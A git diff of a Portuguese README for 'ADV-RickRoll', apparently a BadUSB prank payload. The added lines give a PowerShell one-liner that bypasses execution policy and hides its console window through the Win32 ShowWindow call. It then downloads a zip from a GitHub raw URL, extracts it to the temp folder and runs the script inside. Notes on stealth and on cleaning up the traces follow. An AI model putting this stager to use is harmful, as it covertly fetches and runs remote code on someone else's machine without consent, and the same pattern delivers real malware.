@@ -1,4 +1,3 @@
-![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)
 
 <h1 align="center">
   ADV-RickRoll (Atualizado / Recriado) 😈
@@ -45,14 +44,15 @@ Este programa executa um Rick Roll completo no alvo:
 * Conecte o dispositivo BadUSB ou execute o comando na caixa Executar (`Win + R`):
 
 ```powershell
-powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://raw.githubusercontent.com/xJCPMSx/ADV-RickRoll/main/rr.zip' -O "$D\rr.zip";Expand-Archive "$D\rr.zip" -Des $D\rr -Force;. "$D\rr\rr.ps1"
+powershell -w h -NoP -NonI -Ep Bypass "$i='[DllImport(\"user32.dll\")] public static extern bool ShowWindow(int handle, int state);';add-type -name win -member $i -namespace native -ErrorAction SilentlyContinue;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);Set-Location $env:tmp;irm -Uri 'https://raw.githubusercontent.com/xJCPMSx/ADV-RickRoll/main/rr.zip' -O rr.zip;Expand-Archive rr.zip -Des rr -Force;. .\rr\rr.ps1"
 ```
 
 ## Modifications & Improvements
 
+* **Unificação do StageOne:** A lógica que antes ficava em um arquivo separado (`StageOne.txt`) — incluindo a chamada antecipada à API Win32 `ShowWindow` para ocultar instantaneamente o console e a rotina de download/extração — foi integrada diretamente ao comando único de `ADV-RickRoll.txt`. O arquivo residual `StageOne.txt` foi eliminado, tornando o payload 100% autônomo (standalone).
 * **Servidor Substituído:** Substituição do endpoint inativo `jakoby.lol/qee` pelo link direto no GitHub (`https://raw.githubusercontent.com/xJCPMSx/ADV-RickRoll/main/rr.zip`).
 * **Resolução Dinâmica de Caminho:** O `rr.ps1` agora busca o `rr.mp4` automaticamente no diretório do script (`$PSScriptRoot`), na pasta temporária ou em `$env:TMP\rr\rr.mp4`, corrigindo a falha original que impedia a reprodução dependendo de onde o arquivo era extraído.
-* **Ocultação de Janela (Win32 API):** Chamada direta para `ShowWindow(MainWindowHandle, 0)` no início do `rr.ps1` para garantir que nenhuma janela de terminal fique visível.
+* **Ocultação de Janela (Win32 API) & Carregamento Seguro:** Chamada direta para `ShowWindow(MainWindowHandle, 0)` protegida contra carregamentos duplicados de tipos .NET (`Add-Type`), garantindo que o console permaneça invisível sem disparar exceções de tipo repetido.
 * **Limpeza Refinada:** Remoção específica dos arquivos do payload (`rr.zip`, pasta `rr\`, etc.) antes da limpeza genérica.
 
 ## Contributing
